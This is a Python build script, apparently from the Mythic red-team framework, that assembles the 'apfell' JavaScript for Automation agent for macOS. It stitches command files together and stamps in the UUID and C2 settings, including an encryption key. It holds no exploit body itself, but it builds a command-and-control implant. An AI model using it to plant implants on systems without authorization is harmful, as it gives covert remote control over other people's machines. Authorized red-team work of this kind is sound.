import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class Apfell(PayloadType):
    name = "apfell"
    file_extension = "js"
    author = "@its_a_feature_"
    supported_os = [SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = []
    note = """This payload uses JavaScript for Automation (JXA) for execution on macOS boxes."""
    supports_dynamic_loading = True
    c2_profiles = ["http", "dynamichttp"]
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    build_parameters = []
    agent_path = pathlib.Path(".") / "apfell"
    agent_icon_path = agent_path / "agent_functions" / "apfell.svg"
    agent_code_path = agent_path / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        #create_payload = await MythicRPC().execute("create_callback", payload_uuid=self.uuid, c2_profile="http")
        try:
            command_code = ""
            for cmd in self.commands.get_commands():
                try:
                    command_code += (
                            open(self.agent_code_path / "{}.js".format(cmd), "r").read() + "\n"
                    )
                except Exception as p:
                    pass
            base_code = open(
                self.agent_code_path / "base" / "apfell-jxa.js", "r"
            ).read()
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("COMMANDS_HERE", command_code)
            all_c2_code = ""
            if len(self.c2info) != 1:
                resp.build_stderr = "Apfell only supports one C2 Profile at a time"
                resp.set_status(BuildStatus.Error)
                return resp
            for c2 in self.c2info:
                c2_code = ""
                try:
                    profile = c2.get_c2profile()
                    c2_code = open(
                        self.agent_code_path
                        / "c2_profiles"
                        / "{}.js".format(profile["name"]),
                        "r",
                    ).read()
                    for key, val in c2.get_parameters_dict().items():
                        if key == "AESPSK":
                            c2_code = c2_code.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
                        elif not isinstance(val, str):
                            c2_code = c2_code.replace(key, json.dumps(val))
                        else:
                            c2_code = c2_code.replace(key, val)
                except Exception as p:
                    build_msg += str(p)
                    pass
                all_c2_code += c2_code
            base_code = base_code.replace("C2PROFILE_HERE", all_c2_code)
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring",
                StepStdout="Stamped in all of the fields",
                StepSuccess=True
            ))
            resp.payload = base_code.encode()
            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)
            else:
                resp.build_message = "Successfully built!\n"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
